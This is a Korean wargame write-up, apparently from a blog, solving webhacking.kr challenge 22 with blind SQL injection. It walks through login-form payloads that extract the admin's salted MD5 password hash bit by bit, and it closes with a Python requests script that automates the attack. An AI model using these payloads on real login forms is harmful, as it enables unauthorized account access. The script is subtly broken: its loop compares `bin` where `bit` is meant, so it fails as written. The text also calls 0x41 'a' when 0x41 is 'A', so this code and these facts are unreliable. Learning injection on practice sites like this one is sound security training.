---
title: "webhacking.kr 22번 문제 풀이"
excerpt_separator: "<!--more-->"
categories:
  - webhacking
tags:
  - webhacking
  - wargame
classes: wide
---

[22번 바로가기](http://webhacking.kr/challenge/bonus/bonus-2/)

22번 문제에 들어가면 아래와 같은 화면이 나온다. 생긴게 딱 SQLi 문제같다.

![22번](/img/22번_1.JPG)

밑에 힌트를 보니 admin의 패스워드를 알아내 로그인하면 문제가 풀리는 듯 하다.
회원가입을 위해 join 페이지에 들어가면 id/pw를 등록할 수 있다. 여기서는 id=22, pw=22로 했다. `'`같이 SQLi에 쓰이는 문자을 넣어도 일단 회원가입은 된다.

![22번](/img/22번_2.JPG)

입력한 id와 pw로 로그인할 수 있는데 로그인하면 id와 password의 hash값처럼 보이는 값이 출력된다. 비밀번호가 틀리면 'Wrong!'이 뜬다.

![22번](/img/22번_3.JPG)

![22번](/img/22번_4.JPG)

id= `'` 등 오류가 나는 문자를 입력하면 아래와 같이 오류 메시지가 출력된다.

![22번](/img/22번_5.JPG)

id 입력폼에 여러 값을 넣어본 결과, `union`, `from` 등 SQLi에 쓰이는 일부 값은 필터링된다. 공백, 괄호, `substr()`, `ascii()` 등의 문자열은 필터링되지 않는다.

![22번](/img/22번_6.JPG)

이런 특징을 이용해 Blind SQLi를 할 수 있다. 일반적으로 로그인폼에서 사용되는 쿼리는 다음과 같다.
`SELECT * FROM user WHERE id='$id'and pw='$pw'` 여기서 id 값에 아래와 같이 SQL 문장을 삽입할 수 있다.
`SELECT * FROM user WHERE id='22' or 1=1 #and pw='$pw'` 이렇게 하면 id=22에 해당하는 row가 1개여야 하는데 `or 1=1` 때문에 table내의 모든 row가 select 문의 결과로
나오게된다. 그러면 row가 여러개 존재한다는 에러가 나거나, 가장 위에 존재하는 row에 해당하는 id로 로그인된다.

id=`22' or true #`을 넣고 pw는 비운채 login을 누르면 아래와 같이 다른 페이지로 이동되고 'Wrong password!'라는 문구가 뜬다. 그냥 비밀번호가 틀렸을 때와 다른 반응이다.
id=`22' or false #`를 넣고 pw를 비우고 시도해도 같은 반응이다. pw=22를 넣고 해보면 `22' or true #`의 경우 'Wrong password!'가, `22' or flase #`의 경우 정상적으로 id=22로 로그인된다.
폼의 id 값과 pw값이 각각의 쿼리에 사용되는 것 같다. 어쨌거나 id, pw에 적절한 값을 넣어 SQLi를 할 수 있다.

![22번](/img/22번_7.JPG)

이제 쿼리만 만들면 된다. id에 넣은 값으로 실행되는 쿼리의 결과가 1개일 때와 2개 이상일 때의 차이를 이용하면 된다.
id=`22' or (id='admin' and length(pw)=5)#`, pw=22 이렇게 입력하면 admin의 pw 길이가 5가 맞을 경우 select 문의 결과가 2개 이상이 된다. 그러면 'Wrong password!'가 출력된다.
만약 id 값이 들어간 쿼리의 결과가 1개 즉 id=22번 밖에 없다면 정상적으로 로그인된 화면이 출력된다. 이를 이용해 admin의 pw 길이를 알 수 있는데 32로 나온다.

근데 생각해보니 로그인하면 id 밑에 길이 32의 key값이 출력된다. 회원가입할 때 입력한 pw가 이런식으로 바꿔어서 저장되는 것 같다. 길이가 32니까 MD5 해시일 가능성이 있다.
[여기에서](https://hashkiller.co.uk/Cracker/MD5) MD5 디코딩을 할 수 있다.  id=22로 로그인하면 나오는 key값을 디코딩하니 22zombie로 나온다.

![22번](/img/22번_8.JPG)

입력했던 비밀번호인 22 뒤에 salt로 zombie가 추가된 형태다. 이제 admin의 32글자 pw 해시값만 알아내면 디코딩해서 pw를 구할 수 있다.



id=`22' or (id='admin' and substr(pw, 1, 1)=0x41)#` 이런식으로 1글자씩 비교하여 찾을 수 있는데, 이러면 32글자를 다 찾으려면 한 문자 찾는데 범위 내 모든 ascii값을 시도해 봐야한다.
ascii값을 이진탐색으로 찾아가거나, 비트연산을 사용하는 방법을 사용하면 비교횟수를 줄일 수 있다. 비트연산은 ascii가 1byte니까 (128, 64, 32, 16, 8, 4, 2, 1)과 &(and) 연산을 해서
1비트씩 찾아가는 방법이다. 예를들어 정답이 admin의 pw가 a로 시작한다면 a=0x41 이니까 `ascii(substr(pw, 1, 1))&1=1`, `ascii(substr(pw, 1, 1))&64=64` 만 True가 나온다.
이때 True가 나온 값들을 모두 더하면 (1 + 64 = 65)가 나오고 65는 0x41이며, ascii로 'a'이다. 즉 각 문자당 8번의 비교만으로 값을 찾을 수 있다.
다행히, `substr()`, `ascii()` 등의 문자 및 공백문자, 괄호가 필터링되지 않아 아래와 같은 코드로 쉽게 클리어할 수 있다. 길이 32의 값을 구한 뒤 MD5 디코딩하고 salt인 'zombie'를 제거하고,
id=admin, pw=구한 값을 넣어 로그인하면 된다.

![22번](/img/22번_9.JPG)


```python
import requests
import re


URL = 'http://webhacking.kr/challenge/bonus/bonus-2/index.php'
cookies = {'PHPSESSID': '본인세션값'}
data = {'uuid':'', 'pw':'비밀번호'}
pw = ''

for i in range(1, 33):
    bit = 128
    sum_of_bit = 0
    while bin >= 1:
        data['uuid'] = "아이디' or (id='admin' and ascii(substr(pw,{0},1))&{1}={2})#".format(i, bit, bit)
        response = requests.post(URL, cookies=cookies, data=data)

        if re.findall('Wrong password!', response.text):
            sum_of_bit += bit

        bit = int(bit/2)

    pw += chr(sum_of_bit)
    print('{0} : {1}'.format(i, chr(sum_of_bit)))

print(pw)
```
